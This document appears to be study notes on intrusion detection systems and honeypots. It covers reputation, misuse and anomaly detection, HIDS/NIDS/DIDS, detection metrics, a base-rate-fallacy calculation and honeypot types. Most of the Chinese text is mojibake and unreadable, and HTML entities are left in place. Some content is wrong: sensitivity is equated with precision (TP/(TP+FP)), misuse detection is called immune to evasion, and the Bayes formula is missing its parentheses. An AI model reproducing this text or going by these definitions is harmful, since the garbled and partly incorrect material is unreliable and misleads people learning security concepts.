å°±è¡¨ç¤ºä¸€æ¬¡å…¥ä¾µæ²¡æœ‰è¢«è¯†åˆ«ä¸ºå…¥ä¾µï¼Œæ£€æµ‹æ¡ä»¶å¦‚æœè¾ƒä¸ºå•ä¸€ï¼Œé‚£ä¹ˆç›¸å¯¹è€Œè¨€æ£€æµ‹åˆ°çš„å…¥ä¾µä¼šæ›´åŠ å‡†ç¡®ï¼Œä½†æ˜¯å´ä¼šé—æ¼å¾ˆå¤šçš„å…¥ä¾µï¼Œsoundness     Reputation detection: - è§‚å¯Ÿä¸»æœºæ˜¯å¦ä¸æ›¾ç»è¡Œä¸ºä¸è‰¯çš„ç”¨æˆ·è¿›è¡Œé€šä¿¡   Anomaly-based detection: - é¦–å…ˆå®šä¹‰ç³»ç»Ÿå†…æ­£å¸¸çš„è¡Œä¸ºï¼Œç„¶åæ£€æµ‹é‚£äº›ä¸æ­£å¸¸çš„è¡Œä¸ºï¼Œä¸€èˆ¬ä½¿ç”¨æœºå™¨å­¦ä¹ æ¥è¿›è¡Œè®­ç»ƒå’Œè¯†åˆ«   Misuse-based detection: - é¢„å…ˆå®šä¹‰ä¸è‰¯çš„è¡Œä¸ºä½œä¸ºæ¨¡ç‰ˆï¼Œç„¶åç”¨è¿™äº›æ¨¡ç‰ˆè¿›è¡ŒåŒ¹é…æ£€æµ‹     Reputation based ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†è§‚å¯Ÿä¸»æœºæ˜¯å¦ä¸æ›¾ç»è¡Œä¸ºä¸è‰¯çš„ç”¨æˆ·è¿›è¡Œé€šä¿¡ é‚£ä¹ˆå¦‚ä½•æ¥åˆ¤æ–­è¿™äº›ä¸è‰¯çš„ç”¨æˆ·å‘¢ï¼Ÿ ä¸€åŠäº†æ˜¯åŸºäºOSINTï¼Œå¼€æºçš„æƒ…æŠ¥ä»¥åŠä¸€äº›ç§æœ‰çš„é»‘åå•æ¥è¿›è¡Œç­›é€‰è¯†åˆ«  Malware Domain List (MDL)  Google Safe Browsing    Spamhaus Block Lists  PhishTank   Misuse based é¢„å…ˆå®šä¹‰ä¸è‰¯çš„è¡Œä¸ºä½œä¸ºæ¨¡ç‰ˆï¼Œç„¶åç”¨è¿™äº›æ¨¡ç‰ˆè¿›è¡ŒåŒ¹é…æ£€æµ‹  ä¹Ÿè¢«ç§°ä¸º signature detection,é€šè¿‡è¯†åˆ«å‡ ä¸ªç‰¹å®šçš„signatureæ¥è¿›è¡ŒåŒ¹é…æ£€æµ‹  ä¾èµ–äºæ¶æ„è¡Œä¸ºæ¨¡å‹models of malicious behaviour  åŒæ ·ä½¿ç”¨å¼€æºæƒ…æŠ¥ï¼šIndicators of Compromise (IoC) \u0026amp; Indicators of Attacks (IoA)  IoC/IoA/signature å°±å¦‚åŒfirewallä¸­çš„blacklistä¸€æ ·ï¼Œç”¨æ¥åŒ¹é…é‚£äº›æ¶æ„è¡Œä¸º     Indicators of Compromise (IoCs)\nIoCä¸€èˆ¬æ˜¯ä½œä¸ºå–è¯æ•°æ®ï¼Œä»æ—¥å¿—æˆ–è€…æ–‡ä»¶ä¸­æå–å‡ºæ¥çš„æ¶æ„è¡Œä¸ºç‰¹è¯Š  å¯ä»¥è¢«åˆ†ä¸ºhost-basedæˆ–è€…æ˜¯network-based  ç”šè‡³å¯ä»¥æ˜¯å¾ˆå¤æ‚çš„shellcode  IoCä¸»è¦å…³æ³¨ç‚¹åœ¨å·²ç»å‘ç”Ÿè¿‡çš„å…¥ä¾µï¼Œä»æ—¥å¿—ï¼Œæ–‡ä»¶ç­‰ä¿¡æ¯ä¸­æ¥è¯†åˆ«    Indicators of Attacks (IoAs) : - IoAså°±å…³æ³¨äºæ­£åœ¨å‘ç”Ÿçš„å…¥ä¾µ     Misuse-based detection: pros and cons\nMisuse-based detectionçš„ä¾‹å­ï¼š (traffic source.ip = destination.ip) and (source.port=destination.port) è¿™å°±æ˜¯ä¸€ä¸ªå¾ˆå…¸å‹çš„å¼‚å¸¸è¡Œä¸ºçš„åŒ¹é…ä¸åˆ¤æ–­ Advantages : 1. è¾ƒå°‘çš„false alarms 2. æ¯æ¬¡çš„alertséƒ½ä¼šæœ‰å¯¹åº”çš„è§£é‡Šï¼ˆåŒ¹é…äº†ä»€ä¹ˆæ¨¡å‹ï¼‰ 3. é€Ÿåº¦å¾ˆå¿« 4. ä¸æƒ§æ€•evasionï¼Œå› ä¸ºæ˜¯é¢„å…ˆè®¾å®šå¥½çš„ï¼Œä¸ä¼šæ›´æ”¹ Disadvantage : - åªèƒ½æ£€æµ‹å·²çŸ¥çš„æ”»å‡»ï¼ˆAPTï¼Œzero-dayå°±æŸæ‰‹æ— ç­–äº†ï¼‰  - éœ€è¦ä¸æ–­æ›´æ–°æ¢ä»£ \u0026lt;br/\u0026gt; - å¯¹äºover-stimulation attacksæ¥è¯´æ˜¯é”™è¯¯çš„ \u0026lt;br/\u0026gt;    Anomaly based é¦–å…ˆå®šä¹‰ç³»ç»Ÿå†…æ­£å¸¸çš„è¡Œä¸ºï¼Œç„¶åæ£€æµ‹é‚£äº›ä¸æ­£å¸¸çš„è¡Œä¸ºï¼Œä¸€èˆ¬ä½¿ç”¨æœºå™¨å­¦ä¹ æ¥è¿›è¡Œè®­ç»ƒå’Œè¯†åˆ«  éœ€è¦å…ˆæ”¶é›†ä¸€æ®µæ—¶é—´çš„æ•°æ®æ¥å®šä¹‰æ­£å¸¸çš„è¡Œä¸º  ç„¶åå°†ç»Ÿè®¡æµ‹è¯•çš„ç»“æœåº”ç”¨åˆ°æ£€æµ‹ç”¨æˆ·çš„è¡Œä¸ºæ¥åˆ¤æ–­æ˜¯å¦åˆæ³•  é˜ˆï¼ˆyÃ¹ï¼‰å€¼æ£€æµ‹ Threshold detectionï¼šå¯¹å„ç§æ—¶é—´çš„å‘ç”Ÿé¢‘ç‡è¿›è¡Œå®šä¹‰ï¼ŒæŸ¥çœ‹æ˜¯å¦å‡ºç°å¼‚å¸¸  åŸºäºè´¦æˆ· Profile basedï¼šä¸ºä¸åŒç”¨æˆ·çš„è¡Œä¸ºè¿›è¡Œè®°å½•ç»Ÿè®¡ï¼Œæ¥è§‚å¯Ÿæ¯ä¸ªç”¨æˆ·è¡Œä¸ºçš„å˜åŒ–  ä¾§é‡äºè¿‡å»çš„è¡Œä¸ºï¼Œç„¶åæ£€æµ‹é‡å¤§çš„å˜åŒ–    å¯ä»¥è¢«è®¤ä¸ºæ˜¯ç™½åå•æ£€æµ‹ï¼Œé»˜è®¤ä¸ä¿¡ä»»æ‰€æœ‰çš„è¡Œä¸º     Statistical test\n Mean and standard deviation å¹³å‡å€¼å’Œæ ‡å‡†å·®  é€šè¿‡ä¸€æ®µæ—¶é—´çš„æ•°æ®æ¥è¿›è¡Œè®¡ç®—  å¯ä»¥è¿ç”¨åˆ°å¾ˆå¤šå‚æ•°ä¸Š  ä¸é€‚åˆå•ç‹¬åœ¨IDsä¸Šä½¿ç”¨    Multivariate calculation  ç”¨æ¥å†³å®šå‡ ä¸ªå˜é‡ä¹‹å‰çš„å…³ç³»ï¼ˆä¾‹å¦‚å¤„ç†æ—¶é—´ï¼Œæ•°æ®å ç”¨ï¼Œç™»å½•é¢‘ç‡ç­‰ï¼‰  é€šè¿‡å¯¹äºå˜é‡å…³ç³»çš„åˆ†æå¯ä»¥æ›´å¥½çš„è¿›è¡Œåˆ†ç±»    Markov process  Estimates transition probabilities among various states  Efficient in describing protocol run    Time series model  æ ¹æ®æ—¶é—´æ¬¡åºè¿›è¡Œè®¡ç®—  å¯ä»¥ç”¨æ¥æ£€æµ‹ä¸€äº›æ´»åŠ¨è¿›è¡Œçš„å¤ªå¿«æˆ–è€…å¤ªæ…¢         Pros and Cons\nAdvantages : 1. å¯ä»¥æ£€æµ‹é‚£äº›ä»æ¥æ²¡é‡åˆ°è¿‡çš„æ”»å‡» 2. ä¸éœ€è¦ä¸»åŠ¨å»æ›´æ–° Disadvantage : 1. å¾ˆéš¾è¿›è¡Œé…ç½®ä»¥åŠéœ€è„¸ 2. å®šä¹‰å¼‚å¸¸çš„è¡Œä¸ºä¸ºæ¶æ„çš„æœ‰æ—¶å€™ä¹Ÿä¸å®Œå…¨å‡†ç¡® 3. ä¼šäº§ç”Ÿå¾ˆå¤šçš„ false alarms 4. æ¶ˆè€—å¤§é‡çš„èµ„æº   Other IDS classification  æ ¹æ®æ—¶é—´Timeliness:  Real-timeï¼ˆå®æ—¶åœ¨çº¿è¿è¡Œï¼‰  Non real-time (ç¦»çº¿æ¨¡å¼ï¼Œå®šæœŸè¿›è¡Œ)    ååº”æªæ–½ Response type:  Passive (è¢«åŠ¨çš„ï¼Œåªæœ‰æ£€æµ‹åˆ°äº†æ‰ä¼šå‘å‡ºè­¦å‘Š)  Active (ä¸»åŠ¨å°é”æ¶æ„çš„æµé‡)    State-dependency  Stateful analysisï¼ˆç»“åˆä¸Šä¸‹æ–‡çš„ï¼‰  Stateless analysis    System type:  è½¯ä»¶  ç¡¬ä»¶    Topology æ‹“æ‰‘èŒƒå›´ç±»å‹  Host IDS (HIDS)  Network IDS (NIDS)  Distributed IDS (DIDS)  è§‚å¯Ÿå’Œæ£€æµ‹æ•´ä¸€ä¸ªç½‘ç»œåˆ©ç”¨å¤šç§æ£€æµ‹æ¨¡å¼       HIDS/NIDS/DIDS   Host IDS (HIDS)\nä¸“æ³¨äºæœ¬æœºçš„æ•°æ® NICç½‘å¡éœ€è¦å¤„äºnon-promiscuous mode,å³ä¸ä¼šæ¥å—ä¸è‡ªå·±æ— å…³çš„æ•°æ®åŒ…ï¼Œè¿›è€Œç¼©å°æ£€æµ‹èŒƒå›´ æ£€æµ‹çš„èŒƒå›´:  Logs æ—¥å¿—  System calls ç³»ç»ŸæŒ‡ä»¤  Host activities ç”¨æˆ·è¡Œä¸º   åªå…³æ³¨æœ¬åœ°æœåŠ¡     Network IDS (NIDS)\nä¸“æ³¨äºç½‘ç»œå†…çš„æ‰€æœ‰ä¸»æœº NICå¼€æ”¾promiscuous modeï¼Œæ¥å—æ‰€æœ‰çš„æ•°æ®åŒ… é€šå¸¸ä¼šéƒ¨ç½²åœ¨ï¼š  choke pointsï¼ˆfirewallï¼‰  DMZ  Internal network   Traditional deployment : - IDSè®¾å¤‡è¿æ¥åœ¨trunk points (e.g., firewall)ä¸Šï¼Œæ¥æ£€æµ‹æ‰€æœ‰çš„ç½‘ç»œæµé‡ï¼Œæ£€æµ‹æ”»å‡»ï¼Œä½†æ²¡æœ‰é˜²å¾¡æ‰‹æ®µ  Inline deployment :\nIDSè®¾å¤‡ç›´æ¥ä¸è®¾å¤‡ç›¸è¿æ¥ï¼Œå¯ä»¥è¿›è¡Œæ£€æµ‹å’Œé˜²å¾¡ï¼Œä¾‹å¦‚IPS      Distributed IDS (DIDS)\nåˆ©ç”¨å¤šä¸ªsensorsï¼ˆHIDSï¼ŒNIDSï¼‰æ¥æ”¶é›†æ•°æ®ï¼Œç„¶åå†æ±‡æ€»åˆ°ä¸­å¿ƒçš„ç®¡ç†å™¨ä¸Š ç®¡ç†å‘˜ç»¼åˆåˆ†ææ‰€æœ‰çš„äº‹ä»¶æ¥è¿›è¡Œåˆ†æåˆ¤æ–­ ä¼šéƒ¨ç½²åœ¨ä¸“ç”¨çš„å¤–éƒ¨ç½‘ç»œä¸Šï¼Œä¾‹å¦‚VPN æˆ‘ä»¬åœ¨CFCä¸­å°±æ›¾ç»é‡è§è¿‡ç±»ä¼¼çš„å†…å®¹ Security Information and Event Managementå°±å¯ä»¥ç»Ÿä¸€æ”¶é›†å¹¶ç®¡ç†æ‰€æœ‰çš„æ•°æ®  Hostä¼šåœ¨åå°è¿è¡Œç›‘æ§ç³»ç»Ÿï¼Œç„¶åå°†æ”¶é›†åˆ°çš„æ•°æ®å‘é€åˆ°ä¸­å¤®çš„ç®¡ç†æœåŠ¡å™¨ä¸Šï¼ˆå¤–éƒ¨ç½‘ç»œï¼ŒVPNï¼‰  ä¸­å¤®çš„ç®¡ç†æœåŠ¡å™¨æ”¶é›†æ‰€æœ‰çš„äº‹ä»¶æŠ¥å‘Šï¼ˆä»å†…ç½‘ä¸­ï¼‰ï¼Œç„¶åç»¼åˆåˆ†ææ¥å…¥ä¾µæ£€æµ‹åˆ†æ      IDSæ˜¯å¦‚ä½•å·¥ä½œçš„\n  Input information ä¿¡æ¯è¾“å…¥  Application-specific information åº”ç”¨æ•°æ®  Host-specific information: æœ¬åœ°æ—¥å¿—ï¼Œç³»ç»Ÿæ–‡ä»¶å˜åŒ–ï¼Œç³»ç»Ÿå‘½ä»¤è°ƒç”¨  Network specific information: æ•°æ®æµé‡     Intrusion detection policies  Known bad: blacklist é¢„å®šä¹‰çš„æ”»å‡»æ¨¡å‹  Reputation-based detection  Signature-based/rule-based/misuse-based detection    Known good: æŠ¥å‘Šä»»ä½•å¼‚å¸¸æƒ…å†µ  Anomaly-based detection       å…¥ä¾µæŠ¥å‘Š  passive response (æ£€æµ‹æŠ¥å‘Š)  active response (ä¸»åŠ¨å°é”è¿æ¥)      Alert data: IDS alerts  Log data: complete host logs  Statistical data: network stats  Session data: 5-tuple flows  Packet string data: e.g., HTTP headers  Full packet capture: PCAP files      Packet capture: tcpdump, wireshark  Session data: netflow, IPFIX (Internet Protocol Flow Information Export)  Session string: URLsnarf  Logs: syslog         Measuring performance   True positive: æ£€æµ‹åˆ°çš„å…¥ä¾µæ˜¯çœŸçš„  False positive: æ£€æµ‹åˆ°çš„å…¥ä¾µæ˜¯å‡çš„  True negative: æ£€æµ‹åˆ°çš„åˆæ³•è¡Œä¸ºæ˜¯çœŸçš„  False negative: æ£€æµ‹åˆ°çš„åˆæ³•è¡Œä¸ºæ˜¯å‡çš„ï¼Œå…¶å®æ˜¯å…¥ä¾µ   Sensitivity (True positive rate, probability of detection): measures the proportion of positives that are correctly identified Specificity (True negative rate): measures the proportion of negatives that are correctly identified Sensitivity = True positive rate = Precision = TP / (TP + FP)   it reflects the machine learning algorithmâ€™s performance on â€œHow many times you are right?â€, TP + FP indicates the total sample are labeled by ML as malware (positive) Recall = TP / (TP + FN), it reflects â€œHow many malware found by youâ€, TP + FN means all the actual malware within the dataset   Specificity = True negative rate = TN / (TN + FP) Base-rate fallacy åŸºç‡è°¬è¯¯ æŒ‡çš„æ˜¯äººä»¬åœ¨è€ƒè™‘äº‹ä»¶çš„æ¦‚ç‡çš„æ—¶å€™å¾€å¾€æ²¡æœ‰è€ƒè™‘å…¨éƒ¨çš„ä¿¡æ¯ï¼Œè€Œæ˜¯é€‰æ‹©é‚£äº›ä¸ªæ€§åŒ–çš„ä¿¡æ¯è€Œè‰ç‡çš„å‡ºç»“è®ºï¼Œä»¥åæ¦‚å…¨ A \u0026amp; B æ˜¯ä¸åŒçš„äº‹ä»¶  P(A|B) æ˜¯ä¸€ä¸ªæ¡ä»¶æ¦‚ç‡ï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯åœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼ŒæŸä¸€äº›æ—¶é—´å‘ç”Ÿçš„æ¦‚ç‡ï¼šå½“Bå‘ç”Ÿçš„æƒ…å†µä¸‹ï¼ŒAå‘ç”Ÿçš„æ¦‚ç‡  P(B|A) æ˜¯ä¸€ä¸ªæ¡ä»¶æ¦‚ç‡ï¼šå½“Aå‘ç”Ÿçš„æƒ…å†µä¸‹ï¼ŒBå‘ç”Ÿçš„æ¦‚ç‡  P(A) \u0026amp; P(B) æ˜¯A \u0026amp; Bå•ç‹¬å„è‡ªå‘ç”Ÿçš„æ¦‚ç‡   Bayes\u0026rsquo; theorem  æ ¹æ®è´å¶æ–¯å®šç†ï¼ŒP(A|B) * P(B) = P(B|A) * P(A)å°±æ˜¯Aä¸BåŒæ—¶å‘ç”Ÿçš„æ¦‚ç‡ å¯ä»¥æœ‰æ•ˆçš„ç»¼åˆå¤šä¸ªæ¦‚ç‡ï¼Œä»è€Œå¾—å‡ºä¸€ä¸ªæ›´ä¸ºå¯é çš„ç»¼åˆæ¦‚ç‡ æˆ‘ä»¬å‡è®¾ï¼š   I ä¸ºå…¥ä¾µè¡Œä¸º   Â¬I ä¸ºéå…¥ä¾µè¡Œä¸º   A ä¸ºå‡ºç°å…¥ä¾µè­¦å‘Šäº‹ä»¶   Â¬A æ²¡æœ‰å‡ºç°å…¥ä¾µè­¦å‘Šäº‹ä»¶   True positive rate or detection rate: P(A|I)ï¼Œåœ¨å…¥ä¾µç¡®å®å‘ç”Ÿçš„æƒ…å†µä¸‹ï¼Œå‘å‡ºè­¦å‘Šçš„æ¦‚ç‡   False positive rate of false alarm rate: P(A|Â¬I)ï¼Œåœ¨æ²¡æœ‰å‘ç”Ÿå…¥ä¾µçš„æƒ…å†µä¸‹ï¼Œå‘å‡ºè­¦å‘Šçš„æ¦‚ç‡   False negative rate: P(Â¬A|I) = 1 - P(A|I)ï¼Œåœ¨å…¥ä¾µç¡®å®å‘ç”Ÿçš„æƒ…å†µä¸‹ï¼Œæ²¡æœ‰å‘å‡ºè­¦å‘Šçš„æ¦‚ç‡   True negative rate: P(Â¬A|Â¬I) = 1 - P(A|Â¬I)ï¼Œåœ¨æ²¡æœ‰å‘ç”Ÿå…¥ä¾µçš„æƒ…å†µä¸‹ï¼Œæ²¡æœ‰å‘å‡ºè­¦å‘Šçš„æ¦‚ç‡   P(I|A): åœ¨å‘å‡ºå…¥ä¾µè­¦å‘Šäº‹ä»¶çš„æƒ…å†µä¸‹ï¼ŒçœŸçš„æœ‰å…¥ä¾µäº‹ä»¶çš„æ¦‚ç‡   P(Â¬I|Â¬A): åœ¨æ²¡æœ‰å…¥ä¾µè­¦å‘Šäº‹ä»¶çš„æƒ…å†µä¸‹ï¼Œç¡®å®æ²¡æœ‰å…¥ä¾µçš„æ¦‚ç‡    æˆ‘ä»¬å‡è®¾ä¸€ä¸ªç½‘ç»œç®¡ç†å‘˜åœ¨è¿‡å»çš„ä¸€å¹´ä¸­ï¼Œåœ¨æ¯10,000ä¸ªæ´»åŠ¨ä¸­èƒ½æ£€æµ‹åˆ°1ä¸ªçœŸå®çš„å…¥ä¾µï¼Œç»§ç»­åˆ©ç”¨ä¸Šé¢çš„äº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯ï¼š  P(I) = 1/10000   åŒæ—¶è¿™ä½ç½‘ç»œç®¡ç†å¯¹è‡ªå·±çš„å·¥ä½œååˆ†éª„å‚²ï¼Œå› ä¸ºä»–ä»æ‰€æœ‰å…¥ä¾µä¸­äº²è‡ªå‘ç°äº†è¢«æ£€æµ‹ç³»ç»Ÿé—æ¼çš„5%çš„å…¥ä¾µï¼Œä¹Ÿå°±æ˜¯ï¼š  P(Â¬A|I) = 5%   ä½†ç®¡ç†åˆå¯¹æ£€æµ‹ç³»ç»Ÿéå¸¸çš„ä¸æ»¡ï¼Œå› ä¸ºå…¶ä¸ä»…ä¼šé—æ¼å…¥ä¾µï¼Œè¿˜æœ‰3%çš„å…¥ä¾µè­¦æŠ¥äº‹ä»¶æ˜¯è¯¯æŠ¥ï¼Œä¹Ÿå°±æ˜¯  P(A|Â¬I) = 3%   å¦‚æœæˆ‘ä»¬è¦è®¡ç®—ä¸€ä¸ªè­¦å‘ŠçœŸçš„æ˜¯å…¥ä¾µçš„æ¦‚ç‡ï¼Œä¹Ÿå°±æ˜¯P(I|A)ï¼Œå°±å¯ä»¥å¥—ç”¨ä¸Šé¢çš„å…¬å¼ P(I|A) = P(I) * P(A|I) / P(I) * P(A|I) + P(Â¬I) * P(A|Â¬I)= ((0.0001 * 0.95) / ((0.0001 * 0.95)+(0.9999*0.03)) = 0.00315 \u0026ndash;\u0026gt; 0.32% Honeypots Honeypots as a deception technique Why we need honeypots, since we already have firewalls and IDPS? Firewallå’ŒIDPSæ›´å¤šçš„æ˜¯æ‹¦æˆªå’Œé˜»æ–­æ”»å‡»è€…çš„æ”»å‡»ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³æ›´å¤šçš„äº†è§£attackerï¼Œä»è€Œæå‰æŒæ¡æ½œåœ¨çš„å¨èƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°Honeypotsï¼Œèœœç½ï¼Œç”¨æ¥å¼•è¯±æ”»å‡»è€…æš´éœ²æ›´å¤šçš„ä¿¡æ¯ï¼š  Honeypot èœœç½  æ˜¯ä¸€ä¸ªé™·é˜±å…¶å®æ”¾ç½®äº†æ£€æµ‹ä»¥åŠååˆ¶æ‰‹æ®µæ¥è·å–é‚£äº›æœªç»è®¸å¯çš„è®¿é—®çš„ä¿¡æ¯  åŒæ—¶ä¹Ÿä½œä¸ºè¯±é¥µï¼Œä½¿æ”»å‡»è€…åŸç†é‡è¦çš„ç³»ç»Ÿ  å­¦ä¹ æœªçŸ¥çš„æ”»å‡»  å­¦ä¹ å…¥ä¾µè€…çš„è¡ŒåŠ¨æ¨¡å¼  ä»è€Œæ›´å¥½çš„é¢„æµ‹å’ŒæŠµæŠ—æœªæ¥çš„æ”»å‡»     èœœç½æ²¡æœ‰å®é™…çš„ç”Ÿäº§ä»·å€¼ï¼Œå…¶çŸ¥è¯†ä¸ºäº†é˜²èŒƒå…¥ä¾µ  é‡Œé¢å……æ–¥ç€ä¸€äº›ä¼ªè£…çš„ä¿¡æ¯ï¼Œæ¥å¼•è¯±æ”»å‡»è€…è¿›è¡Œå…¥ä¾µ  å› æ­¤åˆæ³•çš„ç”¨æˆ·ä¸ä¼šä¸å…¶é€šä¿¡ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„é€šä¿¡åªä¼šæ˜¯æ‰«æï¼Œå…¥ä¾µæˆ–è€…ç»™å†œæœº  è¿›è€Œæˆ‘ä»¬å¯ä»¥æ”¶é›†æ”»å‡»è€…çš„æ´»åŠ¨  å¹¶éƒ¨ç½²ä¸€äº›çœ‹èµ·æ¥æœ‰ä»·å€¼çš„ä¿¡æ¯æ¥è¯±å¯¼æ”»å‡»è€…é•¿æ—¶é—´çš„é©»ç•™çš„ç³»ç»Ÿå†…ï¼Œä»¥ä¾¿æˆ‘ä»¬æ›´å¥½çš„æ‰‹æœºä¿¡æ¯  å°½é‡è¦è®©æ”»å‡»è€…æˆåŠŸå…¥ä¾µï¼Œè¿™æ ·æ‰èƒ½ä½¿ä»–ä»¬é©»ç•™ï¼Œå¹¶ç•™ä¸‹ç—•è¿¹  åŒæ—¶ä¹Ÿä¸èƒ½å¤ªå®¹æ˜“å…¥ä¾µï¼Œæœ€å¥½èƒ½è®©æ”»å‡»è€…æ„Ÿåˆ°æœ‰æŒ‘æˆ˜æ€§   Honeypots deployment and classifications   Deployment\nèœœç½ä¸€èˆ¬ä¼šè¢«éƒ¨ç½²åœ¨DMZä¸Šï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨è¾¹ç•Œè·¯ç”±å™¨ä¹‹å¤–ï¼ˆæŒ‡å¤–ç½‘ï¼‰ï¼Œæˆ–è€…å†…ç½‘ä¹Ÿå¯ä»¥ã€‚ è¿›è€Œéƒ¨ç½²è™šæ‹Ÿçš„ç¯å¢ƒï¼ŒåŒæ—¶è¥é€ å‡ºå°½å¯èƒ½çœŸå®çš„ç³»ç»Ÿç¯å¢ƒï¼Œé€šè¿‡æ·±åº¦çš„ç›‘æ§æ¥æ‰‹æœºæ”»å‡»è€…çš„ä¿¡æ¯     Classification\næ ¹æ®ç›®çš„ : - Production honeypots èœœç½äº§å“ - ä¸ºä¼ä¸šçš„ç½‘ç»œç¯å¢ƒæä¾›èœœç½äº§å“ - æ›´å®¹æ˜“éƒ¨ç½²å’Œä½¿ç”¨ - åœ¨æ˜“ç”¨å’Œä¿¡æ¯æ”¶é›†é‡ä¹‹é—´åšå–èˆ - Research honeypots ç ”ç©¶å‹èœœç½ - æä¾›æ›´å…¨é¢çš„æ”»å‡»ä¿¡æ¯ - æ›´éš¾éƒ¨ç½²ï¼Œå› ä¸ºè€ƒè™‘åˆ°æ²¡æœ‰é‚£ä¹ˆä¸“ä¸šçš„å¼€å‘åŠ›é‡æ¥ä¼˜åŒ– - é€šè¿‡æ›´åŠ å…¨é¢åœ°ç ”ç©¶æ”»å‡»ï¼Œè¿›è€Œæ‰¾åˆ°æ›´å¥½çš„è§£å†³æ–¹æ³• æ ¹æ®äº’åŠ¨çš„ç¨‹åº¦ : - æä¾›è¾ƒå°‘äº’åŠ¨çš„èœœç½ - åªæ¨¡æ‹Ÿè¿è¡Œä¸€å°ç»„æœåŠ¡å’Œåº”ç”¨ - ä¸èƒ½è¢«è·å–æ‰€æœ‰æƒé™ - æ”»å‡»è€…çš„äº’åŠ¨è¢«é™åˆ¶ - é€šå¸¸æ˜¯ç”¨åœ¨äº§å“å‹èœœç½ä¸Š - ä¼˜ç‚¹ï¼šé£é™©ä½ï¼Œå®¹æ˜“éƒ¨ç½² - ç¼ºç‚¹ï¼šæ”¶é›†åˆ°çš„ä¿¡æ¯è¾ƒå°‘ï¼Œå› ä¸ºäº’åŠ¨å°‘  - æä¾›è¾ƒå¤šäº’åŠ¨çš„èœœç½ \u0026lt;br/\u0026gt; - ä½¿ç”¨çœŸå®çš„æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ \u0026lt;br/\u0026gt; - æ”»å‡»è€…å¯ä»¥è·å¾—æ‰€æœ‰ç½‘ç»œå’Œç³»ç»Ÿçš„è®¿é—® \u0026lt;br/\u0026gt; - é€šå¸¸ç”¨åœ¨ç ”ç©¶å‹èœœç½ä¸Š \u0026lt;br/\u0026gt; - ä¼˜ç‚¹ï¼šå¯ä»¥è·å–æ›´å¤šçš„ä¿¡æ¯ \u0026lt;br/\u0026gt; - ç¼ºç‚¹ï¼šè¾ƒé«˜çš„é£é™©ï¼Œå¹¶ä¸”ç»´æŠ¤çš„æˆæœ¬æ›´é«˜ \u0026lt;br/\u0026gt;  æ ¹æ®å®ç°çš„æ–¹æ³• : - Physical honeypot ç‰©ç†èœœç½ - ç½‘ç»œä¸Šè¿æ¥çš„çœŸå®è®¾å¤‡ - Virtual honeypot è™šæ‹Ÿèœœç½ - æ¨¡æ‹Ÿä¸»æœºè¿›è¡Œäº’åŠ¨ - ä¸€ä¸ªä¸»æœºå¯ä»¥åŒæ—¶ç»´æŠ¤å’Œè¿è¡Œå¤šä¸ªè™šæ‹Ÿèœœç½ - é€šå¸¸å¯ä»¥æä¾›æ›´å¤šçš„äº’åŠ¨ï¼Œå› ä¸ºè™šæ‹Ÿç¯å¢ƒæ›´ä¸ºå®‰å…¨ æ ¹æ®äº’åŠ¨çš„æ–¹å‘ : - Server honeypots æœåŠ¡å™¨èœœç½ï¼Œå¼€å¯æœåŠ¡  - Client honeypots å®¢æˆ·ç«¯èœœç½ï¼Œè¿æ¥æœåŠ¡å™¨çš„æœåŠ¡ \u0026lt;br/\u0026gt;    Honeypots phases æœ€å¥½çš„æ–¹æ³•ï¼š  è¾ƒé«˜çš„å ¡å’åŒ–ç½‘ç»œ  æ¯ä¸€ä¸ªæ•°æ®åŒ…éƒ½è¿›è¡Œä¿å­˜ï¼Œä¾¿äºåˆ†æå­¦ä¹    Phasesï¼š  Data control  Data capture, æ•æ‰attackeræ‰€äº§ç”Ÿçš„å„ç§data  Data analysisï¼Œåˆ†æè¿™äº›dataï¼Œå­¦ä¹ æ”»å‡»è€…çš„äº’åŠ¨     Data control\nèœœç½é€šè¿‡ä¸æ”»å‡»è€…è¿›è¡Œé€šä¿¡ï¼ˆvia protocolsï¼‰æ¥è¯±å¯¼ä»–ä»¬åšå‡ºè¡ŒåŠ¨ï¼Œç•™ä¸‹è¸ªè¿¹  Bandwidth throttling å®½å¸¦é™æµ  ç”±ISPä¸»åŠ¨ç»™ç½‘ç»œæœåŠ¡é™é€Ÿï¼Œä»è€Œå¢åŠ è®¿é—®èœœç½æ¶ˆè€—çš„æ—¶é—´æˆæœ¬ï¼Œå‡å°‘äº†å¯¹å…¶ä»–ç”¨æˆ·é€ æˆå±å®³çš„æ—¶é—´         Data capture\nèœœç½å°†ä¼šç›‘æ§è¢«è®°å½•æ‰€æœ‰æ”»å‡»è€…åœ¨èœœç½ä¸Šæ‰€è¿›è¡Œçš„æ´»åŠ¨ï¼Œè¿›è€Œé›†ä¸­å­˜å‚¨  Network activity  Application activity  System activity       Data analysis\nèœœç½åˆ†ææ‰€æœ‰æ”¶é›†åˆ°çš„æ´»åŠ¨æ•°æ®  Human-driven analysis  testeræˆ–è€…researcherä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ¥å¤„ç†æ•°æ®è¿›è¡Œåˆ†æ    Machine-driven analysis  å‡è®¾ç½‘ç»œè¿æ¥éƒ½æ˜¯æ¶æ„çš„å’Œå¼‚å¸¸çš„       Case study: catch the ratter RAT: remote administration tools é€šè¿‡è®©æ”»å‡»è€…åˆ©ç”¨RATæ¥è·å–å…¨éƒ¨è™šæ‹Ÿæœºçš„æƒé™æ¥æ‰‹æœºä¿¡æ¯å¹¶ç ”ç©¶ä»–ä»¬çš„è¡Œä¸ºï¼š  Capture audio from microphone  Capture video from webcam  Log keyboard input  Browse files on machine   Honeytokens Honeytokensæ˜¯ä¸€ç§èœœç½çš„å½¢å¼ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯è®¡ç®—æœºæ“ä½œç³»ç»Ÿï¼Œä½†ä¹Ÿè®¸æ˜¯ä¸€ä¸ªï¼š  ä¸ä½¿ç”¨çš„é‚®ç®±åœ°å€  è™šå‡çš„æ•°æ®åº“   è¿™äº›è™šå‡çš„è®¾å¤‡ä¸å†äºä½¿ç”¨ï¼Œè€Œåœ¨äºè¢«å…¥ä¾µå’Œç ´å 